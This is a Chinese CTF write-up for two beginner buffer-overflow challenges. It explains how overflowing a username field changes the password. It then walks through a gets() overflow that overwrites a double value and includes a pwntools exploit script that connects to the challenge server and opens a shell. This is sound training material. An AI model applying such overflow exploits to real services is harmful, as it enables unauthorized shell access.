## PWN-EasyOverflow1

![image-20220509193607393](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509193607393.png)



`给了个nc ip:port;`

nc连接后发现要求输入username，多次尝试输入发现规律，

username只读取前9位字符

![image-20220509193805827](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509193805827.png)

结合题意overflow可联想，超过9位的剩余字符在其他地方发挥了作用

尝试后可知，username处输入的10-18位成为了新的密码

![image-20220509194211988](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509194211988.png)

输入密码即可获得flag



担心同学想不到溢出，也留了个预设密码 password 让大家猜



## PWN-EasyOverflow2

![image-20220509194333125](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509194333125.png)

首先nc连接发现要题目要求我们输入一个数字，尝试输入无果

![image-20220509194716789](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509194716789.png)

打开附件

先用checksec 分析一下该文件

![image-20220509194500596](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509194500596.png)

发现基本保护全关

使用IDA打开该文件

![](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509195125937.png)

发现逆向出来的代码如上图

发现漏洞点 system（“/bin/sh”）

观察代码发现溢出点 gets()函数,并且在number处需要填入11.28125

![image-20220509195401457](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509195401457.png)

11.28125（double）用0x4026900000000000表示

计算溢出量0x1A-0x8

![image-20220509195721267](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509195721267.png)

编写脚本

```python
from pwn import * 
#连接
r = remote("81.69.243.226",30012)
#构造输入
payload = b'a'*18+p64(0x4026900000000000)

r.sendline(payload)
r.interactive()
```

运行脚本得到权限，找到flag

![image-20220509200018457](C:\Users\a1775\AppData\Roaming\Typora\typora-user-images\image-20220509200018457.png)





